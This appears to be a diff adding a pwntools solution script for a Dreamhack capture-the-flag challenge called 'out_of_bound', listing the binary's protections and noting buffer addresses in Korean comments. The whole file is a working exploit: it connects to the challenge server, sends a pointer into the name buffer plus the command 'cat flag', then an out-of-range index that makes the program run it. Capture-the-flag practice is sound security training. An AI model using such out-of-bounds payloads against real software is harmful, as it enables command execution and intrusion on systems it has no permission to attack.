@@ -1,0 +1,31 @@
+from pwn import *
+
+
+'''
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+'''
+
+r = remote("host1.dreamhack.games", 23919)
+
+# r = process("./out_of_bound")
+
+
+# name 시작 주소 0x804a0ac
+# command 시작 주소 0x804a060
+
+payload = p32(0x804a0ac + 4)
+payload += b"cat flag"
+pause()
+r.sendline(payload)
+pause()
+r.sendline("19")
+pause()
+
+r.interactive()
+
+
+
